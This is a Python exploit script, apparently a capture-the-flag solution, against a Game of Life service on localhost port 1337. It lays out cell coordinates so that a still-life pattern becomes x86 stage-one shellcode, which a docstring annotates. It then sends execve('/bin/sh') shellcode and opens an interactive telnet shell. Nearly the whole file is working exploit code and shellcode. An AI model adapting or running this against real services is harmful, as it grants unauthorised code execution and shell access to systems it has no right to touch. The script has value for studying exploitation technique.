import random
import socket
import time
import sys
import telnetlib

TARGET = ('127.0.0.1', 1337)

"""
Executable B3/S23 still life. Ain't that something?

State in the beginning is

* EBX points after last shellcode byte (where we have last written)
* ECX = EAX = 0
* EDX = 1

We increase EDX, set ECX = EBX, EBX = 0 and EAX = 3 (sys_read), then trigger the syscall
to read the second stage.


start:
    dec ecx
    loopne foo
    ...

foo:
    push ebx
    pop ecx
    mov dh, 0x60
    push eax
    pop ebx
    xor al, 0
    loope pwn

pwn:
    xor al, 3
    int 0x80
"""

pattern = """
.#..#..####......##.####......................................................................................
.####..#..#......##.#..#......................................................................................
........##...........##.......................................................................................
.####.........................................................................................................
.#..#.........................................................................................................
..............................................................................................................
..............................................................................................................
..................................#...............................#..............................#............
.................................#.#..##.#.##..##.##.##..##......#.#.....#.##.##..##.#...........#.....#.##...
..................................#...##.##.#..##.##.##..##.......#......##.#.##..#.##...........#.....##.#...
..............................................................................................................
..............................................................................................................
..............................................................................................................
..............#..#............................................................................................
..............####............................................................................................
..............................................................................................................
..##.#........####..##.##.......##............................................................................
..#.##........#..#..##.##.......##............................................................................
"""

grid = pattern.split()

s = socket.create_connection(TARGET)
for i in range(110):
    for j in range(110):
        if i < len(grid) and j < len(grid[i]) and grid[i][j] == '#':
            tosend ='%d,%d' % (j,i)
            s.send(tosend + '\n')

# set ecx to end of our stage1
s.send('40,16\na\n')

print "Wait for it, it's gonna be legen..."
time.sleep(8)
sc = '1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80'
s.send(sc + '\n')
time.sleep(1)
print "...dary! Pls enjoy pwnage"
s.send('echo fooo\n')
buf = ''
while not buf.endswith('fooo\n'):
    buf += s.recv(1)
t = telnetlib.Telnet()
t.sock = s
t.interact()
